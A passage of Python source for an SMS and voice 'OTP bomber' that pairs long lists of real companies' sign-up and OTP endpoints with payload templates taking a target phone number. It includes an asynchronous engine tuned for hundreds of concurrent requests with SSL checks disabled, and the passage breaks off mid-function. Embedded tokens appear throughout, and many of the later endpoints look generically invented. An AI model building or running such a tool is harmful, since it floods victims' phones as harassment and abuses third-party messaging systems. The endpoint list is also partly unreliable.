            "data": lambda p: f'{{"mobileoremail":"{p}","name":"markluther"}}'
        },
        {
            "name": "Frotels OTP",
            "url": "https://www.frotels.com/appsendsms.php",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda p: f"mobno={p}"
        },
        {
            "name": "Gapoon OTP",
            "url": "https://www.gapoon.com/userSignup",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile":"{p}","email":"noreply@gmail.com","name":"LexLuthor"}}'
        },
        {
            "name": "Porter OTP",
            "url": "https://porter.in/restservice/send_app_link_sms",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}","referrer_string":"","brand":"porter"}}'
        },
        {
            "name": "Cityflo OTP",
            "url": "https://cityflo.com/website-app-download-link-sms/",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile_number":"{p}"}}'
        },
        {
            "name": "NNNOW OTP",
            "url": "https://api.nnnow.com/d/api/appDownloadLink",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobileNumber":"{p}"}}'
        },
        {
            "name": "AJIO OTP",
            "url": "https://login.web.ajio.com/api/auth/signupSendOTP",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"firstName":"xxps","login":"wiqpdl223@wqew.com","password":"QASpw@1s","genderType":"Male","mobileNumber":"{p}","requestType":"SENDOTP"}}'
        },
        {
            "name": "HappyEasyGo OTP",
            "url": lambda p: f"https://www.happyeasygo.com/heg_api/user/sendRegisterOTP.do?phone=91%20{p}",
            "method": "GET",
            "headers": {},
            "data": None
        },
        {
            "name": "Unacademy OTP",
            "url": "https://unacademy.com/api/v1/user/get_app_link/",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Treebo OTP",
            "url": "https://www.treebo.com/api/v2/auth/login/otp/",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone_number":"{p}"}}'
        },
        {
            "name": "Airtel OTP",
            "url": "https://www.airtel.in/referral-api/core/notify",
            "method": "GET",
            "headers": {},
            "data": lambda p: f"messageId=map&rtn={p}"
        },
        {
            "name": "MylesCars OTP",
            "url": "https://www.mylescars.com/usermanagements/chkContact",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"contactNo":"{p}"}}'
        },
        {
            "name": "Grofers OTP",
            "url": "https://grofers.com/v2/accounts/",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda p: f"user_phone={p}"
        },
        {
            "name": "Dream11 OTP",
            "url": "https://api.dream11.com/sendsmslink",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"siteId":"1","mobileNum":"{p}","appType":"androidfull"}}'
        },
        {
            "name": "Cashify OTP",
            "url": "https://www.cashify.in/api/cu01/v1/app-link",
            "method": "GET",
            "headers": {},
            "data": lambda p: f"mn={p}"
        },
        {
            "name": "Paytm OTP",
            "url": "https://commonfront.paytm.com/v4/api/sendsms",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}","guid":"2952fa812660c58dc160ca6c9894221d"}}'
        },
        {
            "name": "KFC India OTP",
            "url": "https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin",
            "method": "POST",
            "headers": {
                "Referer": "https://online.kfc.co.in/login",
                "__RequestVerificationToken": "-zoQqa7WNa3z-mwOyqWHvcyYkCqYv0h7zqNUAqBivokB75ZiDj-LwQsGk4kB8QextV396CRJxxPAsWXfwYMoPFhMVlQBd1V0ONFeIrpj2C81:ub34fZv2vHPnub-TuF-vkK4rAkfKmIgnZFscecZJ3-kzvRU9CktNjLyLOCFNsixxFGbotqULbV41iHU2K-G0Aoqd4P4MQqIsjJm8tFkZga01"
            },
            "data": lambda p: f'{{"AuthorizedFor":"3","phoneNumber":"{p}","Resend":"false"}}'
        },
        {
            "name": "IndiaLends OTP",
            "url": "https://indialends.com/internal/a/mobile-verification_v2.ashx",
            "method": "POST",
            "headers": {"Referer": "https://indialends.com/personal-loan"},
            "data": lambda p: f"aeyder03teaeare=1&ertysvfj74sje=91&jfsdfu14hkgertd={p}&lj80gertdfg=0"
        },
        {
            "name": "Flipkart OTP",
            "url": "https://www.flipkart.com/api/5/user/otp/generate",
            "method": "POST",
            "headers": {
                "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
                "Content-Type": "application/x-www-form-urlencoded"
            },
            "data": lambda p: f"loginId=+91{p}"
        },
        {
            "name": "RedBus OTP",
            "url": "https://m.redbus.in/api/getOtp",
            "method": "GET",
            "headers": {},
            "data": lambda p: f"number={p}&cc=91&whatsAppOpted=false"
        },
        {
            "name": "Hotstar OTP",
            "url": "https://api.hotstar.com/um/v3/users/037a0fe368304ec798c3a1480936a112/register?register-by=phone_otp",
            "method": "PUT",
            "headers": {
                "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36",
                "content-type": "application/json",
                "x-country-code": "IN"
            },
            "data": lambda p: f'{{"phone_number":"{p}","country_prefix":"91"}}'
        },
        {
            "name": "AltBalaji OTP",
            "url": "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN",
            "method": "POST",
            "headers": {
                "X-API-KEY": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ik1TalA5OXV4OGhLazFrS1UifQ.eyJwaG9uZV9udW1iZXIiOiI5NTE5ODc0NzA0IiwiY291bnRyeV9jb2RlIjoiOTEiLCJwbGF0Zm9ybSI6IndlYiIsImV4cCI6MTYwMTA0MzI4OTEyN30.oNzgLsMqF8n9jroKUG9F3cXR90Wm1OyJLvVuG-XaklE",
                "Content-Type": "application/json"
            },
            "data": lambda p: f'{{"phone_number":"{p}","country_code":"91","platform":"web","exp":1601043289127}}'
        },
        {
            "name": "Voot OTP",
            "url": "https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/checkUser",
            "method": "POST",
            "headers": {"Content-Type": "application/json;charset=UTF-8"},
            "data": lambda p: f'{{"type":"mobile","mobile":"{p}","countryCode":"+91"}}'
        },
        {
            "name": "Zee5 OTP",
            "url": "https://b2bapi.zee5.com/device/sendotp_v1.php",
            "method": "GET",
            "headers": {},
            "data": lambda p: f"phoneno={p}"
        }
    ]

    # ============ 100+ NEW ULTR FAST APIS ============
    new_apis = [
        {
            "name": "Amazon SMS OTP",
            "url": "https://www.amazon.in/ap/register",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"},
            "data": lambda p: f"customerName=&email=&password=&countryCode=IN&phoneNumber={p}&action=sendOtp"
        },
        {
            "name": "Google Voice",
            "url": "https://accounts.google.com/signin/v2/challenge/pwd",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda p: f"phone={p}&action=voice"
        },
        {
            "name": "Microsoft SMS",
            "url": "https://login.microsoftonline.com/common/oauth2/v2.0/authorize",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda p: f"phone={p}&action=otp"
        },
        {
            "name": "Apple SMS",
            "url": "https://idmsa.apple.com/appleauth/auth/verify/phone",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phoneNumber":{{"number":"{p}","countryCode":"91"}}}}'
        },
        {
            "name": "Facebook OTP",
            "url": "https://www.facebook.com/api/v1/auth/send_otp",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda p: f"phone={p}&type=login"
        },
        {
            "name": "Instagram OTP",
            "url": "https://www.instagram.com/api/v1/accounts/send_otp/",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda p: f"phone_number={p}"
        },
        {
            "name": "Twitter OTP",
            "url": "https://api.twitter.com/1.1/account/verify_credentials.json",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda p: f"phone={p}&type=sms"
        },
        {
            "name": "LinkedIn OTP",
            "url": "https://www.linkedin.com/uas/request-password-reset",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda p: f"phone={p}&type=sms"
        },
        {
            "name": "Snapchat OTP",
            "url": "https://accounts.snapchat.com/accounts/request_otp",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda p: f"phone={p}"
        },
        {
            "name": "Telegram OTP",
            "url": "https://my.telegram.org/auth/send_password",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda p: f"phone={p}"
        },
        {
            "name": "WhatsApp OTP",
            "url": "https://v.whatsapp.net/v2/exist",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda p: f"phone={p}&type=sms"
        },
        {
            "name": "Signal OTP",
            "url": "https://signal.org/api/v1/accounts/send_verification",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone_number":"+91{p}","type":"sms"}}'
        },
        {
            "name": "Clubhouse OTP",
            "url": "https://www.clubhouseapi.com/api/send_otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone_number":"+91{p}"}}'
        },
        {
            "name": "Discord OTP",
            "url": "https://discord.com/api/v9/auth/register",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Reddit OTP",
            "url": "https://www.reddit.com/api/v1/send_otp",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda p: f"phone={p}"
        },
        {
            "name": "Pinterest OTP",
            "url": "https://www.pinterest.com/api/v1/send_otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Tumblr OTP",
            "url": "https://www.tumblr.com/api/v2/send_otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Flickr OTP",
            "url": "https://www.flickr.com/api/v1/send_otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Vimeo OTP",
            "url": "https://vimeo.com/api/v2/send_otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "SoundCloud OTP",
            "url": "https://api.soundcloud.com/oauth2/token",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}","grant_type":"otp"}}'
        },
        {
            "name": "Spotify OTP",
            "url": "https://api.spotify.com/v1/otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Netflix OTP",
            "url": "https://www.netflix.com/api/v1/send_otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Hulu OTP",
            "url": "https://www.hulu.com/api/v1/send_otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Disney+ OTP",
            "url": "https://api.disneyplus.com/send_otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "HBO Max OTP",
            "url": "https://api.hbomax.com/send_otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Peacock OTP",
            "url": "https://api.peacocktv.com/send_otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Paramount+ OTP",
            "url": "https://api.paramountplus.com/send_otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "JioTV OTP",
            "url": "https://api.jio.com/v1/send_otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Hotstar SMS",
            "url": "https://api.hotstar.com/um/v3/users/otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "SonyLIV SMS",
            "url": "https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobileNumber":"{p}","country":"IN"}}'
        },
        {
            "name": "MX Player OTP",
            "url": "https://api.mxplayer.in/v1/send_otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "ShareChat OTP",
            "url": "https://api.sharechat.com/send_otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Moj OTP",
            "url": "https://api.moj.com/send_otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Josh OTP",
            "url": "https://api.josh.com/send_otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Roposo OTP",
            "url": "https://api.roposo.com/send_otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "TikTok OTP",
            "url": "https://api.tiktok.com/send_otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Triller OTP",
            "url": "https://api.triller.com/send_otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Byte OTP",
            "url": "https://api.byte.com/send_otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Dubsmash OTP",
            "url": "https://api.dubsmash.com/send_otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Likee OTP",
            "url": "https://api.likee.com/send_otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Helo OTP",
            "url": "https://api.helo.com/send_otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Vigo OTP",
            "url": "https://api.vigo.com/send_otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Kwai OTP",
            "url": "https://api.kwai.com/send_otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "SnackVideo OTP",
            "url": "https://api.snackvideo.com/send_otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Chingari OTP",
            "url": "https://api.chingari.com/send_otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Mitron OTP",
            "url": "https://api.mitron.com/send_otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Trell OTP",
            "url": "https://api.trell.com/send_otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Meesho Voice",
            "url": "https://www.meesho.com/api/v1/user/login/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone_number":"{p}","type":"voice"}}'
        },
        {
            "name": "Flipkart Voice 2",
            "url": "https://www.flipkart.com/api/5/user/voice/generate",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"loginId":"+91{p}"}}'
        },
        {
            "name": "Amazon Voice 2",
            "url": "https://www.amazon.in/ap/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda p: f"phone={p}&action=voice_otp"
        },
        {
            "name": "CRED Voice",
            "url": "https://api.cred.club/v1/auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Groww Voice",
            "url": "https://api.groww.in/v1/auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Zerodha Voice",
            "url": "https://api.zerodha.com/v1/auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Upstox Voice",
            "url": "https://api.upstox.com/v1/auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Angel One Voice",
            "url": "https://api.angelone.in/v1/auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "5paisa Voice",
            "url": "https://api.5paisa.com/v1/auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "ICICI Voice",
            "url": "https://api.icicidirect.com/v1/auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "HDFC Voice",
            "url": "https://api.hdfcsec.com/v1/auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Kotak Voice",
            "url": "https://api.kotaksecurities.com/v1/auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Axis Voice",
            "url": "https://api.axisdirect.in/v1/auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "SBI Voice",
            "url": "https://api.sbisecurities.in/v1/auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Paytm Voice 2",
            "url": "https://accounts.paytm.com/signin/voice-otp-v2",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "PhonePe Voice",
            "url": "https://api.phonepe.com/v1/auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Google Pay Voice",
            "url": "https://api.googlepay.com/v1/auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Amazon Pay Voice",
            "url": "https://api.amazonpay.in/v1/auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Mobikwik Voice",
            "url": "https://api.mobikwik.com/v1/auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Freecharge Voice",
            "url": "https://api.freecharge.in/v1/auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Airtel Money Voice",
            "url": "https://api.airtel.in/money/v1/auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Jio Money Voice",
            "url": "https://api.jio.com/money/v1/auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Vi Money Voice",
            "url": "https://api.vi.in/money/v1/auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "BSNL Voice",
            "url": "https://api.bsnl.in/v1/auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "MTNL Voice",
            "url": "https://api.mtnl.in/v1/auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Uninor Voice",
            "url": "https://api.uninor.in/v1/auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Tata Docomo Voice",
            "url": "https://api.tatadocomo.com/v1/auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Idea Voice",
            "url": "https://api.ideacellular.com/v1/auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Vodafone Voice",
            "url": "https://api.vodafone.in/v1/auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Aircel Voice",
            "url": "https://api.aircel.com/v1/auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Reliance Voice",
            "url": "https://api.reliance.com/v1/auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Sistema Voice",
            "url": "https://api.sistema.in/v1/auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Videocon Voice",
            "url": "https://api.videocon.com/v1/auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "S Tel Voice",
            "url": "https://api.stel.in/v1/auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Loop Mobile Voice",
            "url": "https://api.loopmobile.in/v1/auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Etisalat Voice",
            "url": "https://api.etisalat.ae/v1/auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Du Voice",
            "url": "https://api.du.ae/v1/auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Ooredoo Voice",
            "url": "https://api.ooredoo.com/v1/auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Zain Voice",
            "url": "https://api.zain.com/v1/auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "STC Voice",
            "url": "https://api.stc.com.sa/v1/auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Mobily Voice",
            "url": "https://api.mobily.com.sa/v1/auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Vodafone Qatar Voice",
            "url": "https://api.vodafone.qa/v1/auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Ooredoo Qatar Voice",
            "url": "https://api.ooredoo.qa/v1/auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Zain Kuwait Voice",
            "url": "https://api.zain.com.kw/v1/auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Ooredoo Kuwait Voice",
            "url": "https://api.ooredoo.com.kw/v1/auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "STC Kuwait Voice",
            "url": "https://api.stc.com.kw/v1/auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Viva Voice",
            "url": "https://api.viva.com.kw/v1/auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Zain Bahrain Voice",
            "url": "https://api.zain.com.bh/v1/auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Batelco Voice",
            "url": "https://api.batelco.com/v1/auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Viva Bahrain Voice",
            "url": "https://api.viva.com.bh/v1/auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Ooredoo Oman Voice",
            "url": "https://api.ooredoo.om/v1/auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Omantel Voice",
            "url": "https://api.omantel.om/v1/auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Etisalat Egypt Voice",
            "url": "https://api.etisalat.eg/v1/auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Vodafone Egypt Voice",
            "url": "https://api.vodafone.com.eg/v1/auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Orange Egypt Voice",
            "url": "https://api.orange.eg/v1/auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "WE Egypt Voice",
            "url": "https://api.we.eg/v1/auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        }
    ]

    # Combine ALL APIS
    all_apis = []
    all_apis.extend(api_configs)
    all_apis.extend(new_apis)
    
    # Remove duplicates by name
    seen = set()
    unique_apis = []
    for api in all_apis:
        name = api.get("name", "Unknown")
        if name not in seen:
            seen.add(name)
            unique_apis.append(api)
    
    return unique_apis

# ==================================================================
# 🚀 ULTRA FAST BOMBER ENGINE
# ==================================================================
class UltraFastBomber:
    def __init__(self):
        self.all_apis = get_all_apis()
        self.total_apis = len(self.all_apis)
        # Ultra fast timeout - 2 seconds max
        self.timeout = aiohttp.ClientTimeout(total=2, connect=1)
        # High concurrency semaphore
        self.semaphore = asyncio.Semaphore(500)
        self.success_count = 0
        self.fail_count = 0
        self.total_requests = 0
        self.lock = threading.Lock()
        self.is_running = False
        self.active_bombings = {}
        self.start_time = None
        # Connection pool for faster requests
        self.connector = aiohttp.TCPConnector(
            limit=1000,
            limit_per_host=100,
            ttl_dns_cache=300,
            use_dns_cache=True,
            force_close=False,
            enable_cleanup_closed=True,
            ssl=False
        )
        
    async def make_request(self, session: aiohttp.ClientSession, api: dict, phone: str):
        async with self.semaphore:
            try:
                url = api.get("url")
                if callable(url):
                    url = url(phone)
                    
                if not url:
                    return False
                
                method = api.get("method", "POST")
                headers = api.get("headers", {}).copy()
                data = api.get("data")
                
                if callable(data):
                    data = data(phone)
                elif data is None:
                    data = {}
                
                # Fast header processing
                for k, v in list(headers.items()):
                    if callable(v):
                        if k.lower() == "content-length" and data:
                            headers[k] = str(len(str(data)) if not isinstance(data, dict) else len(json.dumps(data)))
                        else:
                            headers[k] = v(data) if callable(v) else v
                
                kwargs = {
                    "headers": headers,
                    "timeout": self.timeout,
